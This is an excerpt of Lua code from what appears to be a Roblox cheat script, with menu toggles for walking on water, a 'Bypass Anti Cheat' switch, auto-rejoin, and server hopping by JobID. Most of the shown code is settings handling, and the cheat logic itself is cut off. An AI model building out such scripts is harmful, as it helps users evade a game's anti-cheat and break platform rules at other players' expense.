        if getgenv().tamshitSettings["Walk On Water"] == nil then
            getgenv().tamshitSettings["Walk On Water"] = true
        end
         
        walkonwater = MiscSection:NewToggle("Walk On Water", function(state)
            getgenv().tamshitSettings["Walk On Water"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["Walk On Water"] then walkonwater:UpdateToggle(nil, true) end
        
        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().tamshitSettings["Walk On Water"] then
        ...
        anticheat = MiscSection:NewToggle("Bypass Anti Cheat", function(state)
            getgenv().tamshitSettings['Anti Cheat'] = state
            WriteSettings()
            _G.AntiCheat = state
        end)
        if getgenv().tamshitSettings['Anti Cheat'] then anticheat:UpdateToggle(nil, true) end
        if getgenv().tamshitSettings['Anti Cheat'] == nil then anticheat:UpdateToggle(nil, true) end
        autorejoin = MiscSection:NewToggle("Auto Rejoin", function(state)
            getgenv().tamshitSettings['Auto Rejoin'] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings['Auto Rejoin'] then autorejoin:UpdateToggle(nil, true) end
        if getgenv().tamshitSettings['Auto Rejoin'] == nil then autorejoin:UpdateToggle(nil, true) end
        ...
        local lj = getgenv().tamshitSettings["lastjobid"] or " "
        ...
        ServerSection:NewButton("Hop server to JobID", function()
            getgenv().tamshitSettings["lastjobid"] = _G.JobID
            WriteSettings()
            TeleportService:TeleportToPlaceInstance(game.PlaceId, _G.JobID)
        end)
        ServerSection:NewButton("Hop to last JobID", function()
            if getgenv().tamshitSettings["lastjobid"] then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, getgenv().tamshitSettings["lastjobid"])
            end
        end)
        ...
        uiSection:NewKeybind("Show/Hide UI (Default: RShift)", findKeyCode(getgenv().tamshitSettings["uibutton"]), function(key)
            Library:ToggleUI()
            _G.LastKey = key
        end)
        spawn(
            function()
                while wait() do
                    if _G.LastKey ~= nil and _G.LastKey.Value ~= getgenv().tamshitSettings["uibutton"] then
                        getgenv().tamshitSettings["uibutton"] = _G.LastKey.Value
                        wait(1)
                        WriteSettings()
                    end
                    wait(2)
